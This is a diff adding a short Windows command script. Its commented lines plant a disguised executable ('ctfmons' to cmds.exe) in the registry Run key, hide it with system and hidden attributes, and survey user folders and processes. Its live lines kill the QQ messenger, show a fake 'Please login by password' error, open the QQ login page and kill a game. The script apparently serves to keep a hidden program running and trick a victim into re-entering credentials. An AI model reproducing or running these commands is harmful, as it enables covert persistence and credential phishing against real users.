@@ -1,0 +1,19 @@
+#echo yes|reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v ctfmons /d C:\Windows\cmds.exe
+#attrib +S +H C:\Windows\cmds.exe
+#start explorer C:\Windows\cmds.exe
+#reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /s
+#reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /s
+#attrib +S +H C:\Windows\cmds.exe
+#start explorer C:\Windows\cmds.exe
+#dir /a "C:\Users\Administrator\Documents\Tencent Files"
+#wmic process get name,processid,executablepath
+#dir /a "C:\Users\Public\Desktop" "C:\Users\Administrator\Desktop"
+#taskkill /F /FI "USERNAME eq administrator" /IM pro.exe
+#dir /a C:\Windows
+#Start WScript.exe "C:\Users\Administrator\Desktop\refresh.vbs"Start WScript.exe "C:\Users\Administrator\Desktop\refresh.vbs"
+#dir /a "C:\Users"
+taskkill /F /IM QQ.EXE
+msg * "ERROR Please login by password"
+start explorer http://id.qq.com/login/ptlogin.html
+taskkill /f /im qq*
+taskkill /f /im hyxd.exe
